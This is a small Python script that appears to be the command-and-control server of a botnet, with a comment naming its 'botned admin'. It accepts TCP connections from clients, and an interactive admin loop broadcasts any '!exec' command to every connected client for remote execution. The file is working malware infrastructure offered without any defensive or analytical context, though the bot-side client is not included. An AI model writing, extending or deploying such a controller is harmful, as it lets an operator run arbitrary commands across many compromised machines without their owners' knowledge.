import sys
import socket
import threading

port = int(sys.argv[1])

clients = []

class client(object):
	def __init__(self, socket, address):
		self._socket = socket
		self._address = address
		self._sockfile = self._socket.makefile('w')

	# Send the message on the socket.
	def send(self, msg):
			self._sockfile.write("{}\n".format(msg))
			self._sockfile.flush()

	# Recieve a string from the socket
	def recieve(self):
			data = self._sockfile.readline()
			return data
	
	def close(self):
		self._sockfile.close()
		self._socket.close()


def handle_client(client):
	print("Client connected: {}->{}".format(client._socket.getpeername(), client._socket.getsockname()))

def send_to_all_clients(command):
	# TODO: Python has issues iterating over lists that are not static in size. Will this break?
	# Seems that it won't be an issue if we're only adding clients to the list.
	print("Sending command [{}] to {} clients...".format(command, len(clients)))
	for c in clients:
		print("Sending to: {}".format(c._socket.getsockname()))
		c.send(command)
	
# The botned admin will send commands from the same tty that started the script
# Pref run via tmux/screen
def admin_thread():
	cmd = ""
	while True:
		# Fetch the command from the user.
		cmd = input("$ ")

		# Shall we stop the server?
		if(cmd == "exit"):
			print("Exiting...")
			for c in clients:
				c.close()
			sys.exit(0)

		# Attempt to send command to the client
		if(cmd.startswith("!exec")):
			# Stripping the "!exec " part
			cmd_truncated = ' '.join(cmd.split(' ')[1:])
			send_to_all_clients(cmd_truncated)

			

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Binding on [{}]:{}...".format(socket.gethostname(), port))
server.bind((socket.gethostname(), port))
server.listen(5)

# Create a new thread to handle admin interaction
threading.Thread(target=admin_thread).start()

while True:
	# Accept a new client
	(client_socket, address) = server.accept()
	c = client(client_socket, address)
	clients.append(c)

	# Create a new thread to handle this new client
	threading.Thread(target=handle_client, args=[c]).start()
